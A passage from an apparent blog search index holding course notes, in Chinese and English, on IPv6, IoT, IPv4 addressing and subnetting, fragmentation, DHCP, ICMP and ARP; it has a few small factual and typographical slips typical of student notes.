IPv6</li>\n<li>Tunneling（隧道）：IPv6 使用的一种方法，通过 IPv4 网络传输 IPv6 数据包</li>\n<li>Interface ID（接口 ID）：IPv6 地址的最后 64 位或 4 组，用于标识接口</li>\n</ul>\n<ol start=\"3\">\n<li>IPv6 地址类型</li>\n</ol>\n<ul>\n<li>单播地址（Unicast address）：用于指定网络上的单个节点\n<ul>\n<li>全局地址（Global address）：可以在互联网上路由</li>\n<li>链路本地地址（Link local address）：用于与同一链路上的节点通信</li>\n<li>环回地址（Loopback address）：用于测试接口和支持协议栈的正常运行</li>\n</ul>\n</li>\n<li>多播地址（Multicast address）：将数据包传递给网络上的所有节点</li>\n<li>任播地址（Anycast address）：可以标识多个目的地，数据包会传送到最近的目的地<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/1234c8da95d92bdd.png\" alt=\"image\"></li>\n</ul>\n<ol start=\"4\">\n<li>IPv6 autoconfiguration</li>\n</ol>\n<ul>\n<li>IPv6 地址设计使得计算机可以自动配置其链路本地 IP 地址，这个过程被称为 SLAAC（无状态地址自动配置，Stateless Address Autoconfiguration）。</li>\n<li>步骤：\n<ul>\n<li>创建 IPv6 地址：计算机使用 FE80::/64 作为前 64 位（称为前缀），最后的 64 位通过网络适配器的 MAC 地址生成。</li>\n<li>检查唯一性：计算机检查其 IP 地址在网络中是否唯一。</li>\n<li>请求路由器配置信息：计算机发送一个称为 RS（路由器请求，Router Solicitation）的消息，询问网络中是否有路由器可以提供配置信息。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"IoT\" class=\"active\"><a class=\"anchor\"  href=\"#IoT\">#</a>IoT</h1>\n<ol>\n<li>物联网 (Internet of Things, IoT)</li>\n</ol>\n<ul>\n<li>概念：连接物理和数字领域，将日常物品转化为可感知、通信和处理数据的对象。</li>\n<li>别名：又称为网络物理系统（Cyber-Physical Systems）。<br>\n核心构建模块：传感器网络。</li>\n<li>应用：在物联网中，传感器网络是关键，用于感知和收集周围环境的数据。</li>\n</ul>\n<ol start=\"2\">\n<li>Smart Sensors and Sensor Networks</li>\n</ol>\n<ul>\n<li>智能传感器和传感器网络概念，结合了以下三个主要要素：\n<ul>\n<li>感知 (Sensing)：传感器可以收集环境数据，比如交通流量、水位、温度等信息。</li>\n<li>网络 (Networking)：这些传感器设备通过网络互联，组成一个传感器网络，实现数据的实时传输和共享。</li>\n<li>计算 (Computation)：数据可以在网络中被处理、存储，甚至分析以提供有用的信息。</li>\n</ul>\n</li>\n<li>应用领域\n<ul>\n<li>环境监测：用于交通、栖息地、污染、危险、和安全等领域的数据采集。</li>\n<li>工业监测：用于机器监控和诊断、电力和电信网格监控等。</li>\n<li>人本计算：构建智能化、关注人的空间和环境，比如智能家居和办公环境。</li>\n</ul>\n</li>\n<li>不受限制的微型传感器可以放置在任何地方，检测从交通流量到温度的各种信息，逐渐发展为类似于地球神经系统的结构</li>\n</ul>\n<ol start=\"3\">\n<li>Building Blocks of IoT Applications</li>\n</ol>\n<ul>\n<li>硬件\n<ul>\n<li>处理器：负责数据的处理和控制。</li>\n<li>无线电：提供无线通信功能，用于设备之间的数据传输。</li>\n<li>传感器：收集环境信息，如温度、湿度、光线等。</li>\n<li>执行器：用于执行特定的动作或响应，如打开 / 关闭设备。</li>\n<li>电池：为设备提供电力，使其可以独立工作。</li>\n</ul>\n</li>\n<li>软件\n<ul>\n<li>操作系统：管理设备的硬件资源，提供系统基础服务。</li>\n<li>网络协议：支持设备之间的通信和数据传输。</li>\n<li>设备驱动程序：使操作系统和硬件组件之间能够进行通信。</li>\n<li>可视化：将数据转化为用户友好的图形界面，帮助用户理解数据。</li>\n<li>数据分析：处理和分析收集到的数据，得出有意义的见解。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>物联网（IoT）应用的五层 OSI 模型件：</li>\n</ol>\n<ul>\n<li>应用层（Application Layer）：代表常用的应用协议，如 MQTT 和 CoAP，用于数据的传递与通信。</li>\n<li>传输层（Transport Layer）：使用传输控制协议（TCP）和用户数据报协议（UDP）来保障数据的可靠传输。</li>\n<li>网络层（Network Layer）：RPL 协议常用，用于低功耗和有损网络中的路由。</li>\n<li>MAC 层（MAC Layer）：包括 TSCH、LoRaWAN 和 ZigBee 等协议，提供数据链路层的访问控制。</li>\n<li>物理层（PHY Layer）：标准如 IEEE 802.15.4、IEEE 802.11 和 LoRa 提供了物理连接规范。</li>\n</ul>\n<ol start=\"5\">\n<li>End-to-End Design<br>\n 在物联网（IoT）部署中，计算、通信和传感是关键组成部分。为了设计有效的 IoT 系统，必须全面考虑以下问题：</li>\n</ol>\n<ul>\n<li>计算、传感和通信的内容：明确哪些数据需要被计算、感知和传输，以确保信息的准确性和相关性。</li>\n<li>计算的位置：决定计算是在本地（设备端）还是在云端完成。例如，是否需要在设备上实时处理数据，或是将数据发送到云端进行进一步分析。</li>\n<li>通信的频率：考虑通信的频率，频繁通信会消耗大量电池，因此需要在性能需求和电池寿命之间找到平衡点。</li>\n<li>管理和数据敏感性：\n<ul>\n<li>确定谁将负责管理 IoT 部署，确保系统的安全性和稳定性。</li>\n<li>检查应用中是否包含敏感信息，如果有，则需要考虑如何保护这些信息，以免泄露或被滥用。</li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","WAN","IPv6"]},{"title":"Layer 3 - IP Addressing and IP-related Protocols","url":"/course/Layer-3-IP-Addressing-and-IP-related-Protocols/","content":"<h1 id=\"IP (Internet Protocol) Addressing\" class=\"active\"><a class=\"anchor\"  href=\"#IP (Internet Protocol) Addressing\">#</a>IP (Internet Protocol) Addressing</h1>\n<ol>\n<li>Four addressing methods innetworking</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>层级</th>\n<th>地址类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>应用层 (Layer 7)</td>\n<td>Domain names, computer names, host names</td>\n</tr>\n<tr>\n<td>传输层 (Layer 4)</td>\n<td>Port numbers</td>\n</tr>\n<tr>\n<td>网络层 (Layer 3)</td>\n<td>IP 地址（IPv4、IPv6）</td>\n</tr>\n<tr>\n<td>数据链路层 (Layer 2)</td>\n<td>MAC 地址</td>\n</tr>\n</tbody>\n</table>\n<p>Static IP addresses are assigned manually by the network administrator<br>\nDynamic IP addresses are assigned automatically by a DHCP server</p>\n<ol start=\"2\">\n<li>The Internet Assigned Numbers Authority (IANA)</li>\n</ol>\n<ul>\n<li>IANA delegates 5 regional Internet registries (RIRs)\n<ul>\n<li>RIRs allocate address blocks to Local Internet Registries / National Internet registry</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Internet Registry</th>\n<th>Region</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>African Network Information Centre (AfriNIC)</td>\n<td>Africa</td>\n</tr>\n<tr>\n<td>American Registry for Internet Numbers (ARIN)</td>\n<td>US, Canada, several parts of the Caribbean region, and Antarctica</td>\n</tr>\n<tr>\n<td>Asia-Pacific Network Information Centre (APNIC)</td>\n<td>Asia, Australia, New Zealand, and neighboring countries</td>\n</tr>\n<tr>\n<td>Latin America and Caribbean Network Information Centre (LACNIC)</td>\n<td>Latin America and parts of the Caribbean region</td>\n</tr>\n<tr>\n<td>Réseaux IP Européens Network Coordination Centre (RIPE NCC)</td>\n<td>Europe, Russia, the Middle East, and Central Asia</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Hierarchy of addressing Scheme<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/01/6724cb8ea345d.png\" alt=\"img\"></li>\n</ul>\n<ol start=\"3\">\n<li>Roles of the Network Layer</li>\n</ol>\n<ul>\n<li>The Network layer is where administrators usually do the most network configuration</li>\n<li>This layer is where the IP protocol operates and is the heart of the TCP/IP protocol suite</li>\n<li>The Network layer is responsible for four main tasks:\n<ul>\n<li>It defines and verifies IP addresses</li>\n<li>It routes packets through an internetwork</li>\n<li>It resolves MAC addresses from IP addresses</li>\n<li>It delivers packets efficiently</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>Define and Verify IP Addresses</li>\n</ol>\n<ul>\n<li>An IP address is assigned to every computer and network device using TCP/IP for communications</li>\n<li>IP addresses are used for two main purposes:\n<ul>\n<li>To identify a network device at the Internetwork layer</li>\n<li>To identify the network on which a device resides</li>\n</ul>\n</li>\n<li>When a device receives an IP packet, it compares the destination IP address with its own:\n<ul>\n<li>If it matches or is a broadcast, the packet is processed</li>\n<li>It is does not match then the packet is discarded</li>\n</ul>\n</li>\n<li>Every IP address contains two parts:\n<ul>\n<li>A network ID</li>\n<li>A host ID</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Route Packets through an Internetwork</li>\n</ol>\n<ul>\n<li>The Network layer determines the best way to get a packet from network to network until it reaches its destination</li>\n<li>Most large internetworks (the Internet) have multiple paths for getting from one network to another</li>\n<li>Routers work at the Network layer\n<ul>\n<li>It is routers’ job to select the best path to the destination</li>\n<li>Routers use the network ID portion of IP addresses along with their routing tables to determine the best path</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Resolve MAC Addresses from IP Addresses</li>\n</ol>\n<ul>\n<li>Every frame contains both physical (MAC) and logical (IP) source and destination addresses</li>\n<li>When a packet is ready to be sent to the Network access layer, the destination device’s MAC address must be retrieved before the frame header can be constructed</li>\n<li>TCP/IP uses Address Resolution Protocol (ARP) to find MAC addresses</li>\n</ul>\n<ol start=\"7\">\n<li>Deliver Packets Efficiently</li>\n</ol>\n<ul>\n<li>Network-layer protocols primarily focus on efficient delivery of packets\n<ul>\n<li>Features such as flow control, delivery confirmation or message assembly are <strong>not</strong> included in Network-layer protocols\n<ul>\n<li>These features require overhead to ensure reliable delivery</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Network-layer protocols rely on the protocols in the Transport and Application layers to provide reliability features\n<ul>\n<li>They are considered connectionless protocols, which rely on upper-layer protocols to ensure the safe journey of packets</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"IP (Internet Protocol)\" class=\"active\"><a class=\"anchor\"  href=\"#IP (Internet Protocol)\">#</a>IP (Internet Protocol)</h1>\n<h2 id=\"IPv4\" class=\"active\"><a class=\"anchor\"  href=\"#IPv4\">#</a>IPv4</h2>\n<ol>\n<li>IPv4 Addresses</li>\n</ol>\n<ul>\n<li>An IPv4 address is represented by 32 bits (=4 bytes)\n<ul>\n<li>IPv4 地址分为 4 个字节块（每个块 8 位），每个块用点分隔。</li>\n</ul>\n</li>\n<li>For example\n<ol>\n<li>Binary:  <code>00000001.00000010.10010101.11111111</code> <br>\nDecimal:  <code>1.2.149.255</code></li>\n<li>11000000 . 10101000 . 00000001 . 00000001<br>\n192.168.1.1<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/67258b5520113.png\" alt=\"img\"><br>\nClasses A, B and C licensed IP addresses are available for use on the Internet. Called public IP address</li>\n</ol>\n</li>\n<li>A 类地址\n<ul>\n<li>网络 ID：8 位（第 2 到第 8 位），主机 ID：24 位。</li>\n<li>地址范围：1.x.y.z – 126.x.y.z。</li>\n<li>可用网络数：126 个。</li>\n<li>适用场景：大型网络（如互联网服务提供商和政府机构）。</li>\n</ul>\n</li>\n<li>B 类地址\n<ul>\n<li>网络 ID：16 位（第 3 到第 16 位），主机 ID：16 位。</li>\n<li>地址范围：128.0.y.z – 191.255.y.z。</li>\n<li>可用网络数：16,000 个。</li>\n<li>适用场景：中型网络（如中型企业和大学）。</li>\n</ul>\n</li>\n<li>C 类地址\n<ul>\n<li>网络 ID：24 位（第 4 到第 24 位），主机 ID：8 位。</li>\n<li>地址范围：192.0.0.z – 223.255.255.z。</li>\n<li>可用网络数：约 2 百万个。</li>\n<li>适用场景：小型网络（如小型企业和家庭网络）</li>\n</ul>\n</li>\n<li>D 类地址\n<ul>\n<li>用途：多播地址。</li>\n<li>地址范围：224.0.0.0 – 239.255.255.255。</li>\n<li>网络结构：没有网络 ID 和主机 ID，专用于多播。</li>\n</ul>\n</li>\n<li>E 类地址\n<ul>\n<li>用途：实验用途。</li>\n<li>地址范围：240.0.0.0 – 255.255.255.255。</li>\n<li>说明：保留用于研究和实验，未用于常规互联网流量。</li>\n</ul>\n</li>\n<li>在 IPv4 地址中，127.x.y.z 地址范围（通常是 127.0.0.0 到 127.255.255.255）是保留用于本地主机环回（loopback）测试的特殊地址段。这些地址不会在网络上发送数据包，而是用于本地主机的自我通信，主要目的是测试本地网络堆栈和网络接口卡的功能。\n<ul>\n<li>127.x.y.z 的特点\n<ul>\n<li>环回地址：127.0.0.1 是最常用的环回地址，用于指向本地主机。</li>\n<li>网络测试：使用 127.x.y.z 范围内的地址，系统可以在不通过实际网络的情况下测试网络配置。</li>\n<li>不可路由：127.x.y.z 地址段不会在互联网上路由，数据包始终保持在本地。</li>\n<li>因此，127.x.y.z 地址不属于 A、B、C、D 或 E 类中的网络分配，而是专门保留给环回功能。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>IP 地址范围</th>\n<th>功能描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>255.255.255.255</td>\n<td>用于广播消息，TCP/IP 后台进程会使用该地址发送广播消息，网络中的每个节点都会接收该消息。</td>\n</tr>\n<tr>\n<td>0.0.0.0</td>\n<td>表示当前未分配的地址，一般用于指代 “所有 IPv4 地址” 或 “未知地址”。</td>\n</tr>\n<tr>\n<td>127.0.0.1 至 127.255.255.254</td>\n<td>用于环回测试，表示本地主机的地址，常用于测试网络堆栈（如 127.0.0.1 被称为环回地址）。</td>\n</tr>\n<tr>\n<td>169.254.0.1 至 169.254.255.254</td>\n<td>当设备配置为动态主机配置协议（DHCP）且无法从 DHCP 服务器获取地址时，会自动分配此范围内的地址（APIPA）。</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Private IP addresses<br>\n 在私有网络中，公司可以使用私有 IP 地址。这些地址在互联网上不进行路由，仅限于局域网内使用。<br>\nIEEE 推荐的私有 IP 地址范围：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>私有 IP 地址范围</th>\n<th>用途</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>10.0.0.0 至 10.255.255.255</td>\n<td>用于大型私有网络</td>\n</tr>\n<tr>\n<td>172.16.0.0 至 172.31.255.255</td>\n<td>用于中型私有网络</td>\n</tr>\n<tr>\n<td>192.168.0.0 至 192.168.255.255</td>\n<td>用于小型私有网络（如家庭网络）</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Network Address Translation (NAT)<br>\n 网络地址转换 (NAT) 允许具有私有 IP 地址的主机访问互联网。私有 IP 地址在互联网上不可见，NAT 充当连接私有网络和公共网络的桥梁</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>NAT 类型</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>SNAT (静态 NAT)</td>\n<td>每次主机请求访问互联网时，分配相同的公共 IP 地址。</td>\n</tr>\n<tr>\n<td>DNAT (动态 NAT)</td>\n<td>使用一个公共 IP 地址池，动态地为本地主机分配公共 IP 地址。</td>\n</tr>\n</tbody>\n</table>\n<p><img data-src=\"https://img.picui.cn/free/2024/11/02/67258fc64dac0.png\" alt=\"image\"></p>\n<ol start=\"2\">\n<li>Classless Addressing and Subnet Mask</li>\n</ol>\n<ul>\n<li>Using classful addresses is a waste of IP address resource</li>\n<li>Today, IP addresses are used as classless addresses\n<ul>\n<li>Clients do not apply for particular class of addresses. Instead, getting IP addresses from an ISP</li>\n<li>Most ISPs have already applied for a pool of IP addresses that can be leased to clients</li>\n</ul>\n</li>\n<li>For classless address, use a network mask to determine which part of address denoted the network portion\n<ul>\n<li>32-bit number</li>\n<li>1 signifies the networking bit in the address</li>\n<li>0 signifies the host bits in the address</li>\n</ul>\n</li>\n<li>Masking is a process to extract the address of the physical network from an IP address</li>\n<li>Usually when a router forwards packets from one network to another, it uses this masking to identify if the packets belong to its network or not</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>类别</th>\n<th>点分十进制表示</th>\n<th>二进制模式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>A</td>\n<td>255.0.0.0</td>\n<td>11111111 00000000 00000000 00000000</td>\n</tr>\n<tr>\n<td>B</td>\n<td>255.255.0.0</td>\n<td>11111111 11111111 00000000 00000000</td>\n</tr>\n<tr>\n<td>C</td>\n<td>255.255.255.0</td>\n<td>11111111 11111111 11111111 00000000</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Example\n<ul>\n<li>掩码的工作原理：路由器可以通过掩码判断数据包是否属于其网络。某网络地址是 131.181.x.x，这是一个 B 类地址，其默认网络掩码为 255.255.0.0。</li>\n<li>IP 地址：131.181.112.6（十进制）或 10000011 10110101 01110000 00000110（二进制）</li>\n<li>网络掩码：255.255.0.0（十进制）或 11111111 11111111 00000000 00000000（二进制）</li>\n<li>通过 逻辑与（AND）操作 提取网络地址：<br>\n将 IP 地址和掩码逐位进行 AND 运算：<br>\n10000011 10110101 01110000 00000110（IP 地址）<br>\n11111111 11111111 00000000 00000000（掩码）<br>\n结果：10000011 10110101 00000000 00000000（网络地址）<br>\n网络地址：131.181.0.0</li>\n</ul>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>A</th>\n<th>B</th>\n<th>A AND B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>0</td>\n<td>1</td>\n<td>0</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>0</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Representation of classless addresses\n<ol>\n<li>Address with a subnet mask</li>\n</ol>\n<ul>\n<li>131.181.12.1 subnet mask 255.255.0.0</li>\n</ul>\n<ol start=\"2\">\n<li>Address with a / (slash) representation</li>\n</ol>\n<ul>\n<li>131.181.12.1/16</li>\n<li>/16 means that the first 16 bits are representing the network portion<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/6725988122218.png\" alt=\"image\"></li>\n</ul>\n<ol>\n<li>Hosts A 和 B 是否在同一网络中？</li>\n</ol>\n<ul>\n<li>是的。Host A 的 IP 地址是 192.168.1.10，子网掩码是 255.255.255.0。Host B 的 IP 地址是 192.168.1.11，子网掩码也是 255.255.255.0。使用该子网掩码，网络 ID 是 192.168.1.0，因此 Host A 和 Host B 在同一网络中。</li>\n</ul>\n<ol start=\"2\">\n<li>Hosts A 和 C 是否在同一网络中？</li>\n</ol>\n<ul>\n<li>否。Host A 的网络 ID 是 192.168.1.0，而 Host C 的 IP 地址是 192.168.2.10，子网掩码是 255.255.255.0，其网络 ID 是 192.168.2.0。因此，Host A 和 Host C 不在同一网络中。</li>\n</ul>\n<ol start=\"3\">\n<li>如何让 Host A 能够 ping Host C？需要使用路由器来连接两个网络。由于 Host A 和 Host C 位于不同的网络段（192.168.1.0 和 192.168.2.0），需要通过路由器来转发数据包，从而实现跨网络的通信</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"IPv6\" class=\"active\"><a class=\"anchor\"  href=\"#IPv6\">#</a>IPv6</h2>\n<ul>\n<li>An IPv6 address is represented by 128 bits (=16 bytes)\n<ul>\n<li>Organized in 8 blocks</li>\n<li>Each block consists of 2 bytes (=16 bits) represented by a hexadecimal number\n<ul>\n<li>2001:0000:0B80:0000:0000:00D3:9C5A:00CC</li>\n</ul>\n</li>\n<li>If blocks contain all zeroes, they can be written as double colons (:😃, only one set of double colons is used in an I P address\n<ul>\n<li>2001::B80:0000:0000:D3:9C5A:CC</li>\n<li>2001:0000:B80::D3:9C5A:CC (preferred method because it contains fewest zeroes)</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Co-existence of IPv4 and IPv6\n<ol>\n<li>Dual stack: A network is configured to use both I Pv4 and IPv6<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/67259c726bfc0.png\" alt=\"image\"><br>\n 适用于需要与 IPv4 和 IPv6 网络都兼容的网络环境</li>\n<li>Tunnelling: A method used by IPv6 to transport IPv6 packets through or over an IPv4 network<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/67259c7288d2e.png\" alt=\"image\"><br>\n 适用于尚未完全升级到 IPv6 的网络，以便在 IPv4 网络上实现 IPv6 通信</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"Internet Protocol\" class=\"active\"><a class=\"anchor\"  href=\"#Internet Protocol\">#</a>Internet Protocol</h2>\n<ol>\n<li>IP (Internet Protocol)</li>\n</ol>\n<ul>\n<li>IP operates at the Network layer of the OSI model:\n<ul>\n<li>It specifies where data should be delivered to</li>\n<li>It identifies the data’s source and destination IP addresses</li>\n</ul>\n</li>\n<li>IP implements two basic functions:\n<ul>\n<li>Addressing: Each network device is given an IP address</li>\n<li>Fragmentation: A large-size datagram is broken down to small ones for forwarding</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Features of IP</li>\n</ol>\n<ul>\n<li>IP enables TCP/IP to internetwork\n<ul>\n<li>The Internet is largely based on the IP protocol</li>\n<li>It enables to traverse\n<ul>\n<li>more than one LAN segment, and</li>\n<li>more than one type of network through a router</li>\n</ul>\n</li>\n<li>IP addresses are not really needed for communication within a LAN\n<ul>\n<li>MAC addresses are sufficient in this case</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>IP is an unreliable, connectionless protocol\n<ul>\n<li>This means that IP does not guarantee delivery of data and no session is established before data is transmitted</li>\n<li>IP depends on TCP to ensure messages are put back together in the right order and to ensure each message reaches the correct application on the receiving host</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>IP Header<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/6725a2a0e124d.png\" alt=\"image\"></li>\n</ol>\n<ul>\n<li><strong>IHL (Internet Header Length)</strong>: 表示 IP 头部的长度。</li>\n<li><strong>Total Length Field</strong>: 指数据包的总长度，包括头部和数据部分。</li>\n<li><strong>Identification</strong>: 每个数据包被赋予一个唯一的 ID。若数据包被分片，每个分片都拥有相同的 ID 以便重组。</li>\n<li><strong>Time to Live (TTL)</strong>: 数据包的生命周期（生存时间），每经过一个路由器，该值减少 1，TTL 为 0 时数据包将被丢弃，防止数据包在网络中无限循环。</li>\n<li><strong>Protocol Field</strong>: 指定传输层协议类型（如 TCP 或 UDP），以便路由器知道数据包应该由哪个传输层协议处理。</li>\n</ul>\n<ol start=\"4\">\n<li>Maximum Transmission Unit (MTU)</li>\n</ol>\n<ul>\n<li>MTU is the size of the largest protocol data unit (PDU) that can be communicated in a single network-layer transaction\n<ul>\n<li>Similar to the maximum Parcel Size in the postal system</li>\n</ul>\n</li>\n<li>MTU relates to, but is different from, the maximum frame size that can be transported on the data link layer</li>\n</ul>\n<ol start=\"5\">\n<li>IP Fragmentation</li>\n</ol>\n<ul>\n<li>If a datagram is being sent that is larger than the receiving server’s MTU, it has to be fragmented in order to be transmitted completely.</li>\n<li>Fragmentation is necessary for data transmission, as every network has a unique limit, i.e. the maximum transmission unit (MTU), for the size of datagrams that it can process.</li>\n<li>The 3-bit flags field in the IP header specifies fragmentation is allowed or not\n<ul>\n<li>U 位：未使用。</li>\n<li>D 位（Do Not Fragment bit）：如果设置该位，表示不允许分片；如果数据报大于 MTU，则会被丢弃。</li>\n<li>M 位（More Fragments bit）：如果设置该位，表示后续还有更多分片；如果该位未设置，表示这是最后一个分片。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"6\">\n<li>Fragment Offset (13 bits)</li>\n</ol>\n<ul>\n<li>Fragment offset shows where to place packet’s data when fragments are reassembled into a single packet</li>\n<li>The offset of the data in the original datagram measured in units of 8 bytes\n<ul>\n<li>The first fragment has a zero offset</li>\n</ul>\n</li>\n<li>The offset only records the 1st byte number of that fragmented packet<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/6725a637a3adf.png\" alt=\"image\"></li>\n<li>Issues with IPv4 Fragmentation\n<ul>\n<li>Fragmentation causes more overhead (time and resources) for the receiver when reassembling the fragments, because the receiver must allocate memory for the arriving fragments and coalesce them back into one datagram after all of the fragments are received.</li>\n</ul>\n</li>\n<li>If one fragment of an IPv4 datagram is dropped, then the entire original IPv4 datagram must be resent</li>\n<li>IPv6 packets:\n<ul>\n<li>IPv6 uses a different packet format than IPv4</li>\n<li>Accommodate the much longer IPv6 addresses</li>\n<li>There is no Fragment offset field<br>\n• IPv6 hosts adjust their packet sizes to fit the requirements of the network before sending IPv6 messages<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/02/6725ab470399d.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"DHCP (Dynamic Host Configuration Protocol)\" class=\"active\"><a class=\"anchor\"  href=\"#DHCP (Dynamic Host Configuration Protocol)\">#</a>DHCP (Dynamic Host Configuration Protocol)</h1>\n<ul>\n<li>DHCP is not a pure layer-3 protocol. It is an IP address management protocol, and this generally works at layer 7</li>\n<li>DHCP is a network management protocol. So, strictly speaking, it works at Layer 7</li>\n<li>A DHCP server dynamically assigns an IP address to a network device. It enables computers to request IP addresses and networking parameters automatically from the Internet Service Provider (ISP)</li>\n</ul>\n<h1 id=\"ICMP (Internet Control Message Protocol)\" class=\"active\"><a class=\"anchor\"  href=\"#ICMP (Internet Control Message Protocol)\">#</a>ICMP (Internet Control Message Protocol)</h1>\n<ul>\n<li>\n<p>ICMP is a Network layer, core protocol that reports on the success or failure of data delivery</p>\n</li>\n<li>\n<p>ICMP can indicate:</p>\n<ul>\n<li>When part of a network is congested</li>\n<li>When data fails to reach its destination</li>\n<li>When data has been discarded because the allotted TTL (Time to Live) has expired</li>\n</ul>\n</li>\n<li>\n<p>ICMP announces transmission failures to the sender. But does not correct errors it detects</p>\n</li>\n<li>\n<p>Provides critical information for troubleshooting network problems</p>\n</li>\n<li>\n<p>ICMPv6 on IPV6 networks performs the functions of both ICMP and ARP on IPv4 networks</p>\n</li>\n<li>\n<p>ICMP 数据包包含以下字段，用于提供不同的控制和错误信息：</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>字段</th>\n<th>长度</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Type</strong></td>\n<td>8 位</td>\n<td>指示 ICMP 消息的类型，例如 “目的不可达”。</td>\n</tr>\n<tr>\n<td><strong>Code</strong></td>\n<td>8 位</td>\n<td>指示消息的子类型，例如 “目标主机未知”。</td>\n</tr>\n<tr>\n<td><strong>Checksum</strong></td>\n<td>16 位</td>\n<td>用于检测 ICMP 数据包在传输过程中是否损坏。</td>\n</tr>\n<tr>\n<td><strong>Rest of header</strong></td>\n<td>32 位</td>\n<td>根据消息类型和子类型的不同而变化。</td>\n</tr>\n<tr>\n<td><strong>Data</strong></td>\n<td>可变长度</td>\n<td>通常包含触发 ICMP 消息的 IP 数据包的 IP 头和前 8 字节的数据部分。</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"ARP (Address Resolution Protocol)\" class=\"active\"><a class=\"anchor\"  href=\"#ARP (Address Resolution Protocol)\">#</a>ARP (Address Resolution Protocol)</h1>\n<ol>\n<li>ARP (Address Resolution Protocol)</li>\n</ol>\n<ul>\n<li>ARP is not a pure layer-3 protocol, nor a pure layer-2 protocol. It generally works at layer 2 by using layer 3 IP address information</li>\n<li>ARP works in conjunction with IPv4 to discover the MAC address of a host or node on the local network\n<ul>\n<li>And to maintain a database that maps IP addresses to MAC addresses on the local network</li>\n</ul>\n</li>\n<li>ARP is a Layer 2 protocol that uses Layer 3’s IP address information\n<ul>\n<li>It operates only within its local network</li>\n</ul>\n</li>\n<li>ARP relies on broadcasting</li>\n</ul>\n<ol start=\"2\">\n<li>ARP Table</li>\n</ol>\n<ul>\n<li>ARP table—The database of IP-to-MAC address mappings</li>\n<li>An ARP table can contain two types of entries:\n<ul>\n<li>Dynamic—Created when a client makes an ARP request that could not be satisfied by data already in the ARP table</li>\n<li>Static—Those someone entered manually using the ARP utility (arp command)</li>\n</ul>\n</li>\n<li>Check ARP table\n<ul>\n<li>arp -a<br>\n<img data-src=\"https://cdn-fusion.imgcdn.store/i/2024/ac317e8c48a595ab.png\" alt=\"image\"></li>\n</ul>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system","IP","DHCP","ICMP","ARP"]},{"title":"Layer 3 - Routing and Superheating","url":"/course/Layer-3-Routing-and-Superheating/","content":"<h1 id=\"Routers and routing\" class=\"active\"><a class=\"anchor\"  href=\"#Routers and routing\">#</a>Routers and routing</h1>\n<ol>\n<li>Routers</li>\n</ol>\n<ul>\n<li>A router joins two or more networks and passes packets from one network to another</li>\n<li>Routers can do the following:\n<ul>\n<li>Connect dissimilar networks (LANs and WANs)</li>\n<li>Interpret Layer 3 and often Layer 4 addressing</li>\n<li>Determine the best path for data to follow from point A to point B</li>\n<li>Re-route traffic if the path of first choice is down but another path is available</li>\n</ul>\n</li>\n<li>Routers may perform any of the following optional functions:\n<ul>\n<li>Filter broadcast transmissions</li>\n<li>Prevent certain types of traffic from getting to a network</li>\n<li>Support simultaneous local and remote connectivity</li>\n<li>Provide high network fault tolerance through redundant components such as power supplies</li>\n<li>Monitor network traffic and report statistics</li>\n<li>Diagnose internal or other connectivity problems and trigger alarms</li>\n</ul>\n</li>\n<li>Categories of routers\n<ul>\n<li>Core (interior) routers\n<ul>\n<li>Direct data between networks</li>\n<li>within the same autonomous system (AS)</li>\n</ul>\n</li>\n<li>Edge routers, or border routers\n<ul>\n<li>They connect an autonomous system with an outside network</li>\n</ul>\n</li>\n<li>Exterior routers: any routers outside the organization’s AS\n<ul>\n<li>Direct data between autonomous 